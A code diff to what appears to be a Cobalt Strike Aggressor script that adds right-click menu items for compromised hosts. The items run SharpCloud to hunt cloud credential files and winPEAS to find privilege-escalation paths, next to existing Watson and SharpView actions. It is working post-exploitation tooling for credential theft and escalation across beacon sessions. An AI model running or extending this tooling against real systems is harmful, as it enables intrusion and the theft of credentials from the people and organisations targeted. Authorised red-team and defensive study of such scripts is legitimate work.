@@ -132,6 +132,20 @@ menu "Find Files"
 
 {
 
+######## Find Cloud Credential Files  ##################
+
+		item "Find Cloud Creds"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					cloudcreds($bid);
+
+				}
+
+			}
+
 ######## Find Domain Share  ##################
 
 					
@@ -192,7 +206,13 @@ menu "Privilege Escalation"
 					escalateprivs($bid);
 				}
 			}
-		
+########Run WinPEAS##################		
+		item "Run WinPEAS to find privilege escalation"{
+			local('$bid');
+				foreach $bid ($1){
+					winpeas($bid);
+				}
+			}
 }
 ##############################################################################End of Menu
 menu "Domain Computer Object Enumeration"
@@ -480,9 +500,16 @@ bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
 sub escalateprivs{
 bexecute_assembly($1, script_resource('/exe/Watson.exe'));
 }
+sub winpeas{
+bexecute_assembly($1, script_resource('/exe/winPEASany.exe'));
+}
 ########################## SharpView Find Domain Share
 sub finddomainshare{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-DomainShare");
+}
+########################## Cloud Creds
+sub cloudcreds{
+bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
 }
 ########################## SharpView Find Interesting Domain Shares
 sub findinterestingdomainsharefile{
